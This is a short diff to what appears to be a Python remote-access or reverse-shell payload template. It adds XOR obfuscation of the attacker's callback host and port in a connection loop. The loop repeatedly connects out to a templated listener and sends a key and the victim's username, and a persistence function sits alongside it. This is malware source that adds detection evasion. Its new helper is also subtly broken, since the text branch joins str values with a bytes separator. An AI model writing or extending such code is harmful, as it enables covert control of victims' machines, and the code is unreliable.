@@ -721,10 +721,19 @@ def persist(reg_name, copy_name):
         pass
 
 def connection():
+    def xor_strings(s, t) -> bytes:
+        if isinstance(s, str):
+            # Text strings contain single characters
+            return b"".join(chr(ord(a) ^ ord(b)) for a, b in zip(s, t))
+        else:
+
+            return bytes([a ^ b for a, b in zip(s, t)])
     while True:
         time.sleep(5)
         try:
-            s.connect(('$lhost',$lport))
+            port = xor_strings($lport, $portkey).decode('utf8')
+            host = xor_strings($lhost, $hostkey).decode('utf8')
+            s.connect((host,int(port)))
 
             s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
 
